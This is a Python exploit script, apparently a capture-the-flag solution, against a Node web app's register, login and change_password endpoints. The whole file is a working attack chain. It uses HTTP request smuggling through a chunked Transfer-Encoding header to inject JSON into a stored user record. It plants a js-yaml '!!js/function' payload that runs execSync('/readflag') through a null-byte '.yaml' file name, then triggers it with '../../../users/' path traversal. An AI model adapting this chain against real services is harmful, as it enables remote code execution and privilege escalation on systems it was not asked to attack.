import requests
import socket
import pycurl
import os
import json
from io import BytesIO
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("target", nargs="?", default="http://localhost:3000")
parser.add_argument("--http-username", default="")
parser.add_argument("--http-password", default="")
args = parser.parse_args()

target = args.target
if target.endswith("/"):
    target = target[:-1]
http_username = args.http_username
http_password = args.http_password
password = 1111111111111111111111111111111


def get_sess():
    sess = requests.Session()
    if http_username and http_password:
        sess.auth = (http_username, http_password)
    return sess


def register(username, password, priloc="before"):
    if priloc == "before":
        data = {"privilegeLevel": "user", "username": username, "password": password}
    else:
        data = {"username": username, "password": password, "privilegeLevel": "user"}
    assert (
        get_sess()
        .post(
            f"{target}/register",
            json=data,
        )
        .json()["success"]
    )


def json_inject(username, content, priloc="before"):
    register(username, password, priloc)

    payload = json.dumps(
        {
            "username": username,
            "old_password": password,
            "new_password": content,
        }
    )
    c = pycurl.Curl()
    c.setopt(c.URL, f"{target}/login")
    if http_username and http_password:
        c.setopt(c.USERPWD, f"{http_username}:{http_password}")
    c.setopt(c.POST, 1)
    c.setopt(c.HTTPHEADER, ["Transfer-Encoding: CHUNKED"])
    c.setopt(
        c.POSTFIELDS,
        f"POST /change_password HTTP/1.0\r\nContent-Length: {len(payload)}\r\n\r\n"
        + payload,
    )
    c.setopt(c.WRITEDATA, BytesIO())
    c.perform()
    c.close()


yamluser = os.urandom(8).hex()
json_inject(
    yamluser + ".yaml\0",
    """"peko", "access": {"profile": true}, "privilegeLevel": { toString: !!js/function "function(){ console.log('pwned'); flag=process.mainModule.require('child_process').execSync('/readflag','utf-8').toString(); return flag }" } } # """,
    priloc="after",
)
print(yamluser)
lfiuser = os.urandom(8).hex()
json_inject(lfiuser, f'"peko", "privilegeLevel": "../../../users/{yamluser}"')
print(lfiuser)

sess = get_sess()
print(
    sess.post(
        f"{target}/login",
        json={"username": lfiuser, "password": "peko"},
    ).json()
)
print(sess.get(f"{target}/profile").text)
